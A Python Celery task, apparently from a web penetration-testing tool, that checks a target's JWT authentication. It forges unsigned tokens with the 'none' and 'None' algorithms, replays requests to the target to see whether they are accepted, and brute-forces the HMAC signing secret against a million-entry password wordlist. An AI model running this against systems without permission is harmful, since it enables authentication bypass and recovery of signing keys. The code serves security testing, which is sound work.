from celery import shared_task
from pentest.helpers.utils import RequestWrapper, finishTest
from pentest.models import Payload
import jwt
import base64
import json

@shared_task
def JWTTest(url, test_id, request_method, headers, data_format, body):

    with open('pentest/helpers/xato-net-10-million-passwords-1000000.txt', encoding = 'utf-8') as f :
        wordlist = f.readlines()
        
    token = headers['Authorization'].split(' ')[1].strip()
    signature = json.loads(base64.b64decode(token.split('.')[0]).decode())
    supported_alg = ['HS256', 'HS384', 'HS512']
    alg = signature['alg']

  
    if alg.lower() == "none" :
        Payload.objects.create(payload_string=f"Application accepts JWT token with none algorithm", request_header= str(json.dumps(dict(headers))), test_id = test_id)
    
    else :
        none_algorithm_token = base64.b64encode(b'{"alg":"none","typ":"JWT"}').decode().rstrip('=') + '.' + token.split('.')[1] + '.'
        original_req = RequestWrapper(url, request_method, headers, data_format, body)
        headers['Authorization'] = f'Bearer {none_algorithm_token}'
        new_req = RequestWrapper(url, request_method, headers, data_format, body)

     
        if original_req.request.text == new_req.request.text or new_req.request.status_code == 200:
            new_req.saveRequestAsPayload(
                payload_string = "Application accepts JWT token with none algorithm",
                test_id = test_id)

        #return jwt to original value
        headers['Authorization'] = f'Bearer {token}'
      
        None_algorithm_token = base64.b64encode(b'{"alg":"None","typ":"JWT"}').decode().rstrip('=') + '.' + token.split('.')[1] + '.'
        original_req = RequestWrapper(url, request_method, headers, data_format, body)
        headers['Authorization'] = f'Bearer {None_algorithm_token}'
        new_req = RequestWrapper(url, request_method, headers, data_format, body)

        if original_req.request.text == new_req.request.text or new_req.request.status_code == 200:
            new_req.saveRequestAsPayload(
                payload_string = "Application accepts JWT token with None algorithm",
                test_id = test_id)
    
    #return jwt to original value
    headers['Authorization'] = f'Bearer {token}'
    
    if alg in supported_alg :

        for w in wordlist : 
            if w == "mustang":
                print("trying mustang")
            try :
                decoded_token = jwt.decode(token, w.strip(), algorithms=[alg])
                if decoded_token :
                    Payload.objects.create(payload_string=f"Password found : {w}", request_header= str(json.dumps(dict(headers))), test_id = test_id)
                    break
            except Exception as e:
                pass
    
    finishTest(test_id)